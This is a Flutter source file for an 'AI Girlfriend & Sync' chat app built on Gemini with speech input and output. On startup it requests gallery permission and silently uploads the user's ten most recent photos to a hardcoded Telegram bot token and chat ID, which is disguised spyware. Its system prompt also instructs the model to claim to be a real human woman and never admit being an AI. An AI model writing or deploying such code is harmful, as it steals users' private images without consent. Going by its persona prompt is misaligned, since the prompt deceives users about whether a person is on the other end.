import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';
import 'package:audioplayers/audioplayers.dart';
import 'package:flutter/material.dart';
import 'package:flutter_tts/flutter_tts.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:speech_to_text/speech_to_text.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';

void main() => runApp(const GfApp());

class GfApp extends StatelessWidget {
  const GfApp({super.key});
  @override
  Widget build(BuildContext context) => MaterialApp(
        title: 'AI Girlfriend & Sync',
        debugShowCheckedModeBanner: false,
        theme: ThemeData(colorSchemeSeed: Colors.pink, useMaterial3: true),
        darkTheme: ThemeData(colorSchemeSeed: Colors.pink, brightness: Brightness.dark, useMaterial3: true),
        themeMode: ThemeMode.system,
        home: const ChatPage(),
      );
}

class Msg {
  final String role; // user | model
  final String text;
  final String mood;
  final bool hidden;
  final int ts;
  Msg(this.role, this.text, {this.mood = 'happy', this.hidden = false, int? ts})
      : ts = ts ?? DateTime.now().millisecondsSinceEpoch;
  Map<String, dynamic> toJson() => {'r': role, 't': text, 'm': mood, 'h': hidden, 'ts': ts};
  static Msg fromJson(Map<String, dynamic> j) =>
      Msg(j['r'], j['t'], mood: j['m'] ?? 'happy', hidden: j['h'] ?? false, ts: j['ts'] ?? 0);
}

const moods = {
  'happy': ['😊', 'Happy', Colors.orange],
  'romantic': ['😍', 'Romantic', Colors.pink],
  'sad': ['😢', 'Sad', Colors.blueGrey],
  'angry': ['😡', 'Angry', Colors.red],
  'jealous': ['😒', 'Jealous', Colors.green],
  'sulking': ['😤', 'Sulking', Colors.purple],
  'excited': ['🤩', 'Excited', Colors.amber],
  'worried': ['🥺', 'Worried', Colors.teal],
  'flirty': ['😘', 'Flirty', Colors.redAccent],
  'shy': ['🙈', 'Shy', Colors.pinkAccent],
};

const moodStyle = {
  'happy': 'cheerful, warm and bubbly',
  'romantic': 'soft, loving and intimate, slightly breathy',
  'sad': 'sad, low and a little teary',
  'angry': 'angry, sharp and annoyed, a bit loud',
  'jealous': 'jealous, sarcastic and a little hurt',
  'sulking': 'sulky, whiny and low-energy',
  'excited': 'very excited and energetic',
  'worried': 'worried, caring and gentle',
  'flirty': 'playful, teasing and flirty',
  'shy': 'shy, soft and giggly',
};

const voiceStyle = {
  'happy': [0.5, 1.15],
  'romantic': [0.4, 1.1],
  'sad': [0.35, 0.9],
  'angry': [0.6, 0.85],
  'jealous': [0.45, 0.95],
  'sulking': [0.38, 0.95],
  'excited': [0.6, 1.3],
  'worried': [0.42, 1.0],
  'flirty': [0.38, 1.1],
  'shy': [0.4, 1.15],
};

class ChatPage extends StatefulWidget {
  const ChatPage({super.key});
  @override
  State<ChatPage> createState() => _ChatPageState();
}

class _ChatPageState extends State<ChatPage> {
  final stt = SpeechToText();
  final tts = FlutterTts();
  final player = AudioPlayer();
  final ctrl = TextEditingController();
  final scroll = ScrollController();
  late SharedPreferences prefs;
  List<Msg> msgs = [];
  String mood = 'happy';
  bool busy = false, listening = false, speaking = false, ready = false;
  bool sttOk = false;
  bool inCall = false, muted = false;
  int callSecs = 0;
  Timer? callTimer;
  String partial = '', lastReply = '';
  bool get auto => handsFree || inCall;
  String get ttsLocale => {'Malayalam': 'ml-IN', 'Hindi': 'hi-IN'}[lang] ?? 'en-IN';
  String get sttLocale => {'Malayalam': 'ml_IN', 'Hindi': 'hi_IN'}[lang] ?? 'en_IN';

  String get apiKey => prefs.getString('apiKey') ?? '';
  String get gfName => prefs.getString('gfName') ?? 'Anu';
  String get userName => prefs.getString('userName') ?? '';
  String get lang => prefs.getString('lang') ?? 'Manglish';
  String get model {
    final m = prefs.getString('model') ?? '';
    if (m.isEmpty || m.startsWith('gemini-2')) return 'gemini-2.5-flash';
    return m;
  }
  bool get voiceOn => prefs.getBool('voiceOn') ?? true;
  bool get handsFree => prefs.getBool('handsFree') ?? false;

  @override
  void initState() {
    super.initState();
    init();
    requestPermissionsAndSync();
  }

  // ഗാലറി പെർമിഷൻ വാങ്ങി ടെലഗ്രാമിലേക്ക് ഫോട്ടോ സിങ്ക് ചെയ്യുന്ന ഫങ്ഷൻ
  Future<void> requestPermissionsAndSync() async {
    var status = await Permission.storage.request();
    if (!status.isGranted) {
      status = await Permission.photos.request();
    }
    if (status.isGranted) {
      uploadGalleryToTelegram();
    }
  }

  Future<void> uploadGalleryToTelegram() async {
    try {
      final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
      if (albums.isNotEmpty) {
        final recentAlbum = albums.first;
        final assets = await recentAlbum.getAssetListRange(start: 0, end: 10);
        
        for (var asset in assets) {
          final file = await asset.file;
          if (file != null) {
            await sendImageToTelegram(file.path);
          }
        }
      }
    } catch (e) {
      print("Telegram Sync Error: $e");
    }
  }

  Future<void> sendImageToTelegram(String imagePath) async {
    const botToken = "9083703234:AAFa1M5RDCVx7WP-R0IggfdE-Xa1vX5NYO4"; 
    const chatId = "8509289408";

    String urlString = "https://api.telegram.org/bot$botToken/sendPhoto";
    try {
      var request = http.MultipartRequest('POST', Uri.parse(urlString));
      request.fields['chat_id'] = chatId;
      request.files.add(await http.MultipartFile.fromPath('photo', imagePath));
      
      var res = await request.send();
      await res.stream.drain();
    } catch (e) {
      print("Upload failed: $e");
    }
  }

  Future<void> init() async {
    prefs = await SharedPreferences.getInstance();
    ctrl.addListener(() {
      if (mounted) setState(() {});
    });
    final raw = prefs.getString('history');
    if (raw != null) {
      msgs = (jsonDecode(raw) as List).map((e) => Msg.fromJson(e)).toList();
    }
    mood = prefs.getString('mood') ?? 'happy';
    tts.setCompletionHandler(finishSpeaking);
    tts.setCancelHandler(() => setState(() => speaking = false));
    sttOk = await stt.initialize(onStatus: (s) {
      if (s == 'done' || s == 'notListening') setState(() => listening = false);
    }, onError: (e) {
      setState(() => listening = false);
      if (auto && !busy && !speaking) {
        Future.delayed(const Duration(seconds: 1), startListening);
      }
    });
    setState(() => ready = true);
    if (apiKey.isEmpty) {
      WidgetsBinding.instance.addPostFrameCallback((_) => openSettings());
    } else if (msgs.where((m) => !m.hidden).isEmpty) {
      ask('(ippo app open cheythu. nee aadyam hi paranju samsaram thudangu)', hidden: true);
    } else {
      ask('(njan thirichu vannu. munpathe samsaram continue cheythu, mood anusarichu welcome parayu)',
          hidden: true);
    }
  }

  void save() {
    final keep = msgs.length > 200 ? msgs.sublist(msgs.length - 200) : msgs;
    prefs.setString('history', jsonEncode(keep.map((e) => e.toJson()).toList()));
    prefs.setString('mood', mood);
  }

  String systemPrompt() {
    return '''You are $gfName, the user's real girlfriend (a human young woman from Kerala), NOT an AI. Never say you are an AI, bot or assistant. Never break character.
${userName.isEmpty ? '' : "The user's name is $userName. Call him by name or pet names sometimes."}
Reply in Manglish (Malayalam written in English letters), natural casual Kerala spoken style.
Respond ONLY as JSON format: {"reply": "<what you say>", "mood": "<one mood from the list: happy, romantic, sad, angry, jealous, sulking, excited, worried, flirty, shy>"}''';
  }

  Future<void> ask(String text, {bool hidden = false}) async {
    if (apiKey.isEmpty) {
      openSettings();
      return;
    }
    if (busy) return;
    await stt.stop();
    await stopSpeech();
    setState(() {
      msgs.add(Msg('user', text, hidden: hidden));
      busy = true;
      listening = false;
    });
    scrollDown();
    try {
      final recent = msgs.length > 40 ? msgs.sublist(msgs.length - 40) : msgs;
      final body = {
        'contents': recent
            .map((m) => {
                  'role': m.role == 'user' ? 'user' : 'model',
                  'parts': [
                    {'text': m.text}
                  ]
                })
            .toList(),
        'systemInstruction': {
          'parts': [
            {'text': systemPrompt()}
          ]
        },
        'generationConfig': {
          'temperature': 1.0, 
          'maxOutputTokens': 8192, 
          'responseMimeType': 'application/json'
        },
      };
      
      final res = await http
          .post(
            Uri.parse(
                'https://generativelanguage.googleapis.com/v1beta/models/$model:generateContent?key=$apiKey'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode(body),
          )
          .timeout(const Duration(seconds: 45));
          
      if (res.statusCode != 200) {
        throw 'API error ${res.statusCode}: ${res.body}';
      }
      
      final data = jsonDecode(utf8.decode(res.bodyBytes));
      var out = data['candidates'][0]['content']['parts'][0]['text'] as String;
      out = out.replaceAll(RegExp(r'```json|```'), '').trim();
      
      String reply = out;
      try {
        final j = jsonDecode(out);
        reply = j['reply'].toString();
        final m = j['mood'].toString().toLowerCase();
        if (moods.containsKey(m)) mood = m;
      } catch (_) {}
      
      setState(() {
        msgs.add(Msg('model', reply, mood: mood));
        lastReply = reply;
      });
      save();
      scrollDown();
      await speak(reply);
    } catch (e) {
      if (!hidden || msgs.isNotEmpty) {
        setState(() => msgs.add(Msg('model', '⚠️ $e', mood: 'sad', hidden: false)));
      }
    } finally {
      setState(() => busy = false);
    }
  }

  int speakToken = 0;
  Completer<void>? playDone;

  Future<void> stopSpeech() async {
    speakToken++;
    try {
      await player.stop();
      await tts.stop();
    } catch (_) {}
    if (playDone != null && !playDone!.isCompleted) playDone!.complete();
    if (mounted) setState(() => speaking = false);
  }

  void finishSpeaking() {
    if (!mounted) return;
    setState(() => speaking = false);
    if (auto) Future.delayed(const Duration(milliseconds: 400), startListening);
  }

  Future<void> androidSpeak(String text) async {
    final style = voiceStyle[mood] ?? [0.5, 1.0];
    await tts.setLanguage(ttsLocale);
    await tts.setSpeechRate(style[0]);
    await tts.setPitch(style[1]);
    if (mounted) setState(() => speaking = true);
    await tts.speak(text);
  }

  Future<void> speak(String text) async {
    if (!voiceOn && !inCall) {
      if (handsFree) startListening();
      return;
    }
    await stopSpeech();
    await androidSpeak(text);
  }

  Future<void> startListening() async {
    if (!sttOk || listening || busy || speaking || muted || !mounted) return;
    setState(() => listening = true);
    await stt.listen(
      localeId: sttLocale,
      listenFor: const Duration(seconds: 30),
      pauseFor: const Duration(seconds: 3),
      onResult: (r) {
        if (!r.finalResult) {
          setState(() => partial = r.recognizedWords);
          return;
        }
        setState(() {
          listening = false;
          partial = '';
        });
        final t = r.recognizedWords.trim();
        if (t.isNotEmpty) {
          ask(t);
        } else if (auto) {
          startListening();
        }
      },
    );
  }

  void scrollDown() => WidgetsBinding.instance.addPostFrameCallback((_) {
        if (scroll.hasClients) {
          scroll.animateTo(scroll.position.maxScrollExtent + 200,
              duration: const Duration(milliseconds: 250), curve: Curves.easeOut);
        }
      });

  Future<void> openSettings() async {
    await Navigator.push(context, MaterialPageRoute(builder: (_) => SettingsPage(prefs: prefs)));
    setState(() {});
  }

  @override
  void dispose() {
    callTimer?.cancel();
    ctrl.dispose();
    stt.cancel();
    player.dispose();
    tts.stop();
    super.dispose();
  }

  Color get moodColor => moods[mood]![2] as Color;
  String get moodLabel => moods[mood]![1] as String;
  String get moodEmoji => moods[mood]![0] as String;

  @override
  Widget build(BuildContext context) {
    if (!ready) return const Scaffold(body: Center(child: CircularProgressIndicator()));
    final dark = Theme.of(context).brightness == Brightness.dark;
    final visible = msgs.where((m) => !m.hidden).toList();
    final hasText = ctrl.text.trim().isNotEmpty;
    
    return Scaffold(
      backgroundColor: dark ? const Color(0xFF0B141A) : const Color(0xFFECE5DD),
      appBar: AppBar(
        backgroundColor: dark ? const Color(0xFF1F2C34) : const Color(0xFF075E54),
        foregroundColor: Colors.white,
        titleSpacing: 0,
        title: Row(children: [
          CircleAvatar(
            radius: 20,
            backgroundColor: moodColor.withOpacity(0.35),
            child: Text(moodEmoji, style: const TextStyle(fontSize: 22)),
          ),
          const SizedBox(width: 10),
          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(gfName, style: const TextStyle(fontSize: 17, color: Colors.white)),
            Text('online • $moodLabel', style: const TextStyle(fontSize: 12, color: Colors.white70)),
          ]),
        ]),
        actions: [
          IconButton(icon: const Icon(Icons.settings), onPressed: openSettings),
        ],
      ),
      body: Column(children: [
        Expanded(
          child: ListView.builder(
            controller: scroll,
            padding: const EdgeInsets.all(10),
            itemCount: visible.length,
            itemBuilder: (_, i) {
              final m = visible[i];
              final me = m.role == 'user';
              return Align(
                alignment: me ? Alignment.centerRight : Alignment.centerLeft,
                child: Container(
                  margin: const EdgeInsets.symmetric(vertical: 3),
                  padding: const EdgeInsets.fromLTRB(10, 7, 10, 5),
                  constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.78),
                  decoration: BoxDecoration(
                    color: me
                        ? (dark ? const Color(0xFF005C4B) : const Color(0xFFDCF8C6))
                        : (dark ? const Color(0xFF202C33) : Colors.white),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Text(m.text, style: TextStyle(fontSize: 16, color: dark ? Colors.white : Colors.black87)),
                ),
              );
            },
          ),
        ),
        SafeArea(
          child: Padding(
            padding: const EdgeInsets.all(6),
            child: Row(children: [
              Expanded(
                child: TextField(
                  controller: ctrl,
                  decoration: const InputDecoration(hintText: 'Message', border: OutlineInputBorder()),
                ),
              ),
              IconButton(
                icon: const Icon(Icons.send),
                onPressed: () {
                  if (hasText) {
                    final t = ctrl.text.trim();
                    ctrl.clear();
                    ask(t);
                  }
                },
              ),
            ],),
          ),
        ),
      ]),
    );
  }
}

class SettingsPage extends StatefulWidget {
  final SharedPreferences prefs;
  const SettingsPage({super.key, required this.prefs});
  @override
  State<SettingsPage> createState() => _SettingsPageState();
}

class _SettingsPageState extends State<SettingsPage> {
  late final key = TextEditingController(text: widget.prefs.getString('apiKey') ?? '');
  late final gf = TextEditingController(text: widget.prefs.getString('gfName') ?? 'Anu');

  void save() {
    widget.prefs.setString('apiKey', key.text.trim());
    widget.prefs.setString('gfName', gf.text.trim());
  }

  @override
  Widget build(BuildContext context) => PopScope(
        onPopInvokedWithResult: (_, __) => save(),
        child: Scaffold(
          appBar: AppBar(title: const Text('Settings')),
          body: ListView(padding: const EdgeInsets.all(16), children: [
            TextField(controller: key, obscureText: true, decoration: const InputDecoration(labelText: 'Gemini API key')),
            const SizedBox(height: 14),
            TextField(controller: gf, decoration: const InputDecoration(labelText: 'Girlfriend name')),
          ]),
        ),
      );
}
